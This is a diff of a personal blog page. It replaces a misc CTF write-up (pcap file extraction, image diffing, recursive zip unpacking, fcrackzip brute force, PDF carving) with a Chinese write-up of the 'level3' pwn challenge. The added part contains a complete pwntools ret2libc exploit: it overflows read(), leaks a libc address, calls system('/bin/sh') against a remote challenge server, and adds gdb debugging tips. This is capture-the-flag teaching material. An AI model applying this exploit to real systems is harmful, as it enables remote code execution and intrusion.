@@ -55,21 +55,18 @@
   };
 </script>
 
-  <meta name="description" content="cephalopod题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下过滤一下只要ceph协议。追踪流，可以尝试搜索’{‘和’ctf’等关键字看是否有flag，发现并没有，但在第二个流发现了图片的文件头，IHDR是PNG图片的文件头，其中包括PNG图片的基本信息，必须在PNG图片前面">
+  <meta name="description" content="level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者123456789```c++ssize_t vulnerable_function()&amp;#123;  char buf; // [esp+0h] [ebp-88h]  write(1, &amp;quot;Input:\n&amp;quot;, 7u);  return read(0, &amp;amp;buf, 256u);&amp;#125;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xman-misc">
-<meta property="og:url" content="http://yoursite.com/2019/08/12/xman-misc/index.html">
+<meta property="og:title" content="XCTF-PWN">
+<meta property="og:url" content="http://yoursite.com/2019/08/15/XCTF-PWN/index.html">
 <meta property="og:site_name" content="faint-star">
-<meta property="og:description" content="cephalopod题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下过滤一下只要ceph协议。追踪流，可以尝试搜索’{‘和’ctf’等关键字看是否有flag，发现并没有，但在第二个流发现了图片的文件头，IHDR是PNG图片的文件头，其中包括PNG图片的基本信息，必须在PNG图片前面">
+<meta property="og:description" content="level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者123456789```c++ssize_t vulnerable_function()&amp;#123;  char buf; // [esp+0h] [ebp-88h]  write(1, &amp;quot;Input:\n&amp;quot;, 7u);  return read(0, &amp;amp;buf, 256u);&amp;#125;">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://user-images.githubusercontent.com/42031559/62858792-de2a4180-bd2d-11e9-9e1b-de1a14c7cd32.png">
-<meta property="og:image" content="https://user-images.githubusercontent.com/42031559/62858798-e71b1300-bd2d-11e9-8ce1-dc3a0862ac22.png">
-<meta property="og:updated_time" content="2019-08-12T12:09:27.559Z">
+<meta property="og:updated_time" content="2019-08-15T15:46:22.777Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xman-misc">
-<meta name="twitter:description" content="cephalopod题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下过滤一下只要ceph协议。追踪流，可以尝试搜索’{‘和’ctf’等关键字看是否有flag，发现并没有，但在第二个流发现了图片的文件头，IHDR是PNG图片的文件头，其中包括PNG图片的基本信息，必须在PNG图片前面">
-<meta name="twitter:image" content="https://user-images.githubusercontent.com/42031559/62858792-de2a4180-bd2d-11e9-9e1b-de1a14c7cd32.png">
-  <link rel="canonical" href="http://yoursite.com/2019/08/12/xman-misc/">
+<meta name="twitter:title" content="XCTF-PWN">
+<meta name="twitter:description" content="level3漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者123456789```c++ssize_t vulnerable_function()&amp;#123;  char buf; // [esp+0h] [ebp-88h]  write(1, &amp;quot;Input:\n&amp;quot;, 7u);  return read(0, &amp;amp;buf, 256u);&amp;#125;">
+  <link rel="canonical" href="http://yoursite.com/2019/08/15/XCTF-PWN/">
 
 
 <script id="page-configurations">
@@ -83,7 +80,7 @@
   };
 </script>
 
-  <title>xman-misc | faint-star</title>
+  <title>XCTF-PWN | faint-star</title>
   
 
 
@@ -198,7 +195,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/12/xman-misc/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/15/XCTF-PWN/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -212,7 +209,7 @@
       <header class="post-header">
 
         
-          <h1 class="post-title" itemprop="name headline">xman-misc
+          <h1 class="post-title" itemprop="name headline">XCTF-PWN
 
             
           </h1>
@@ -229,7 +226,7 @@
                 
               
 
-              <time title="Created: 2019-08-12 18:14:10 / Modified: 20:09:27" itemprop="dateCreated datePublished" datetime="2019-08-12T18:14:10+08:00">2019-08-12</time>
+              <time title="Created: 2019-08-15 22:34:34 / Modified: 23:46:22" itemprop="dateCreated datePublished" datetime="2019-08-15T22:34:34+08:00">2019-08-15</time>
             </span>
           
             
@@ -248,37 +245,17 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="cephalopod"><a href="#cephalopod" class="headerlink" title="cephalopod"></a>cephalopod</h2><p>题目是一个流量包，ceph是一种通信协议，我们用wireshark打开点一下过滤一下只要ceph协议。</p><p><img src="https://user-images.githubusercontent.com/42031559/62858792-de2a4180-bd2d-11e9-9e1b-de1a14c7cd32.png" alt="ceph1"></p><p>追踪流，可以尝试搜索’{‘和’ctf’等关键字看是否有flag，发现并没有，但在第二个流发现了图片的文件头，IHDR是PNG图片的文件头，其中包括PNG图片的基本信息，必须在PNG图片前面</p><a id="more"></a>
+        <h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>漏洞是read，缓冲区溢出；但没有可以利用的函数或system或者<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```c++</span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  write(1, &quot;Input:\n&quot;, 7u);</span><br><span class="line">  return read(0, &amp;buf, 256u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><a id="more"></a>
+<p><strong>exp:</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = cyclic(0x100)</span></span><br><span class="line">io = process(<span class="string">'./level3'</span>)</span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">45330</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr = <span class="number">0x08048484</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">0x8c</span>*<span class="string">'a'</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="string">'write:'</span>+hex(write))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"write"</span>, write)</span><br><span class="line">system = write + obj.dump(<span class="string">"system"</span>) - obj.dump(<span class="string">"write"</span>)      <span class="comment">#system offset</span></span><br><span class="line">bin_sh = write + obj.dump(<span class="string">"str_bin_sh"</span>) - obj.dump(<span class="string">"write"</span>)   <span class="comment">#/bin/sh offset</span></span><br><span class="line">info(<span class="string">'system:'</span>+hex(system))</span><br><span class="line">info(<span class="string">'/bin/sh:'</span>+hex(bin_sh))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x8c</span>*<span class="string">'b'</span>+p32(system)+p32(main_addr)+p32(bin_sh)</span><br><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
+<p><strong>调试技巧:</strong></p>
+<p>在read处按下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">断点下在 ```0x08048482``` 处</span><br><span class="line"></span><br><span class="line">```assembly</span><br><span class="line">.text:08048482                 leave</span><br><span class="line">.text:08048483                 retn</span><br></pre></td></tr></table></figure></p>
+<p>python里加上调试语句，python脚本运行时会自动打开<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line"># gdb.attach(io)</span><br></pre></td></tr></table></figure></p>
+<p>但由于收发速度不同，我们需要在每次发送数据前加上pause，这样就可以让<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">io.recvuntil(&apos;Input:\n&apos;)</span><br><span class="line"># pause()</span><br><span class="line">io.sendline(payload1)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">'Input:\n'</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload2)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://user-images.githubusercontent.com/42031559/62858798-e71b1300-bd2d-11e9-8ce1-dc3a0862ac22.png" alt="ceph2"></p>
-<p>linux下使用tcpxtract分离，其中一张图片即为flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpxtract -f 40150e85ac1b4952f1c35c2d9103d8a40c7bee55.pcap</span><br></pre></td></tr></table></figure>
-
-<h2 id="Erik-Baleog-and-Olaf"><a href="#Erik-Baleog-and-Olaf" class="headerlink" title="Erik-Baleog-and-Olaf"></a>Erik-Baleog-and-Olaf</h2><p>压缩包打开是一张图片，按道理图片里肯定藏了东西，但用binwalk等工具查看并没有什么异常，这里参考了老外的方法，找一张和这张图片一样的图片，对比一下不同</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compare hint.png stego100.png -compose src diff.png</span><br></pre></td></tr></table></figure>
-
-<p>hint.png是网上找的和和题目一样的图片，diff是输出的不同，打开是一个二维码，扫码即可</p>
-<h2 id="Miscellaneous-300"><a href="#Miscellaneous-300" class="headerlink" title="Miscellaneous-300"></a>Miscellaneous-300</h2><p>一个压缩包，解压需要密码，用binwalk或者16进制编辑器都能发现里面还有一个压缩包，并且名字也是数字，尝试后发现里面压缩包的名字是外面压缩包的解压密码，写脚本循环解压</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,sys,zipfile</span><br><span class="line">original_file=<span class="string">'12475.zip'</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    original_file = zipfile.ZipFile(original_file)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'zip'</span> <span class="keyword">in</span> original_file.namelist()[<span class="number">0</span>]:</span><br><span class="line">        inner_zipfile = original_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        original_file_password = inner_zipfile[:inner_zipfile.find(<span class="string">'.'</span>)]</span><br><span class="line">        original_file.setpassword(original_file_password)</span><br><span class="line">        original_file.extractall()</span><br><span class="line">        os.remove(original_file.filename)</span><br><span class="line">        original_file = inner_zipfile</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-<p>到最后一层12475.zip无法解压了，这个时候进行爆破</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -l 1-6 -c 'a1' 12475.zip</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>-u：使用unzip解压</li>
-<li>-l：后面接长度范围</li>
-<li>-c：后接字符，a为所有小写字母，1是数字[0-9]</li>
-</ul>
-<h2 id="小小的PDF"><a href="#小小的PDF" class="headerlink" title="小小的PDF"></a>小小的PDF</h2><p>打开是一个pdf，是pdf隐写，使用foremost来提取隐藏内容</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost -i 2333.pdf -o test</span><br></pre></td></tr></table></figure>
-
-<p>foremost是基于文件头及尾部信息恢复文件的工具。</p>
-<h2 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h2><ul>
-<li><a href="https://chybeta.github.io/2017/08/25/流量包提取文件方法/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/25/%E6%B5%81%E9%87%8F%E5%8C%85%E6%8F%90%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95/</a></li>
-<li><a href="https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/erik-baleog-and-olaf</a></li>
-<li><a href="https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300" target="_blank" rel="noopener">https://github.com/MarioVilas/write-ups/tree/master/defkthon-ctf/misc-300</a></li>
-</ul>
+<p>在填充至返回地址的时候，可以用<code>gdb</code>跟踪到ret指令处，此时查看<code>$esp</code>寄存器的内容，可以检查自己的地址是否填正确。</p>
 
     </div>
 
@@ -295,8 +272,8 @@
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
               
-                <a href="/2019/08/11/xman/" rel="next" title="XMAN-2019-福州营">
-                  <i class="fa fa-chevron-left"></i> XMAN-2019-福州营
+                <a href="/2019/08/12/xman-misc/" rel="next" title="xman-misc">
+                  <i class="fa fa-chevron-left"></i> xman-misc
                 </a>
               
             </div>
@@ -304,10 +281,6 @@
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2019/08/15/XCTF-PWN/" rel="prev" title="XCTF-PWN">
-                  XCTF-PWN <i class="fa fa-chevron-right"></i>
-                </a>
               
             </div>
           </div>
@@ -382,7 +355,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#cephalopod"><span class="nav-number">1.</span> <span class="nav-text">cephalopod</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Erik-Baleog-and-Olaf"><span class="nav-number">2.</span> <span class="nav-text">Erik-Baleog-and-Olaf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Miscellaneous-300"><span class="nav-number">3.</span> <span class="nav-text">Miscellaneous-300</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小小的PDF"><span class="nav-number">4.</span> <span class="nav-text">小小的PDF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Refference"><span class="nav-number">5.</span> <span class="nav-text">Refference</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">1.</span> <span class="nav-text">level3</span></a></li></ol></div>
             
 
           </div>
